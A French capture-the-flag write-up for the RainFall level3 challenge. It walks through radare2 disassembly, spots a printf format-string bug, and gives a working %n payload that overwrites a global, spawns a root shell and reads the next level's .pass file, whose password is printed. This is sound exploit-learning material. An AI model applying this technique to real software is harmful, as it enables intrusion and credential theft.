@@ -1,0 +1,91 @@
+On teste le binaire pour savoir ce qu'il fait, il ouvre un stream puis print deux fois dans la sortie standare le param mis dans le stream
+
+radare2 : pdf @main
+
+[0x0804988c]> pdf @main
+            ; DATA XREF from entry0 @ 0x8048407
+┌ 13: int main (int argc, char **argv, char **envp);
+│           0x0804851a      55             push ebp
+│           0x0804851b      89e5           mov ebp, esp
+│           0x0804851d      83e4f0         and esp, 0xfffffff0
+│           0x08048520      e87fffffff     call sym.v
+│           0x08048525      c9             leave
+└           0x08048526      c3             ret
+
+Rien de folichon, on fait la meme pour la fonction v
+
+[0x0804988c]> pdf @sym.v
+            ; CALL XREF from main @ 0x8048520
+┌ 118: sym.v ();
+│           ; var char *format @ ebp-0x208
+│           ; var size_t size @ esp+0x4
+│           ; var FILE *nitems @ esp+0x8
+│           ; var FILE *stream @ esp+0xc
+│           0x080484a4      55             push ebp
+│           0x080484a5      89e5           mov ebp, esp
+│           0x080484a7      81ec18020000   sub esp, 0x218
+│           0x080484ad      a160980408     mov eax, dword [obj.stdin]  ; obj.stdin__GLIBC_2.0
+│                                                                      ; [0x8049860:4]=0
+│           0x080484b2      89442408       mov dword [nitems], eax     ; FILE *stream
+│           0x080484b6      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
+│           0x080484be      8d85f8fdffff   lea eax, [format]
+│           0x080484c4      890424         mov dword [esp], eax        ; char *s
+│           0x080484c7      e8d4feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+│           0x080484cc      8d85f8fdffff   lea eax, [format]
+│           0x080484d2      890424         mov dword [esp], eax        ; const char *format
+│           0x080484d5      e8b6feffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x080484da      a18c980408     mov eax, dword [obj.m]      ; [0x804988c:4]=0
+│           0x080484df      83f840         cmp eax, 0x40               ; 64
+│       ┌─< 0x080484e2      7534           jne 0x8048518
+│       │   0x080484e4      a180980408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
+│       │                                                              ; [0x8049880:4]=0
+│       │   0x080484e9      89c2           mov edx, eax
+│       │   0x080484eb      b800860408     mov eax, str.Wait_what___n  ; 0x8048600 ; "Wait what?!\n"
+│       │   0x080484f0      8954240c       mov dword [stream], edx     ; FILE *stream
+│       │   0x080484f4      c74424080c00.  mov dword [nitems], 0xc     ; [0xc:4]=-1 ; 12 ; size_t nitems
+│       │   0x080484fc      c74424040100.  mov dword [size], 1         ; size_t size
+│       │   0x08048504      890424         mov dword [esp], eax        ; const void *ptr
+│       │   0x08048507      e8a4feffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
+│       │   0x0804850c      c704240d8604.  mov dword [esp], str._bin_sh ; [0x804860d:4]=0x6e69622f ; "/bin/sh" ; const char *string
+│       │   0x08048513      e8a8feffff     call sym.imp.system         ; int system(const char *string)
+│       │   ; CODE XREF from sym.v @ 0x80484e2
+│       └─> 0x08048518      c9             leave
+└           0x08048519      c3             ret
+
+Ici on peut voir que si eax == 64 on rentre dans l'autre parti du code qui ouvre un sh
+
+on test
+
+level3@RainFall:~$ ./level3
+64
+64
+level3@RainFall:~$
+
+Ca marche pas donc relecture plus reflexion.
+
+Ok on remarque que printf prend simplement un const char*
+
+On test donc test un param qui s'apparente a un format qui pourrai etre utilise sur print comme %s par exemple
+
+level3@RainFall:~$ ./level3
+%s
+Segmentation fault (core dumped)
+
+On a un segfault. En faisant des recherche sur les vulerabilite de printf on remarque si prinft prend une string sans avoir un format de specifier peut ouvrir a des d'overflow. En effet si le format n'ai pas specifier en lui donnant un format comme %n on peut lui renvoyer une adresse memoire.
+
+Dans notre cas le const char* est present mais pas le format donc c'est pour ca que ca que si on mettait 64 ca marchait et si on mettait un format seul sa segfaulted.
+
+Donc en recuperant l'adresse de la comparaison du 64 0x804988c et en y attribuant 60 byte, plus le %n on devrait pouvoir arrive a quelque chose.
+
+
+python -c 'print "\x8c\x98\x04\x08" + "o" * 60 + "%4$n"' > /tmp/run ; le %4$n c'est pour inclure l'adresse et comme c'est de l'hexa ca vos 4 bytes
+
+level3@RainFall:~$ cat /tmp/run - | ./level3
+�oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+et voila
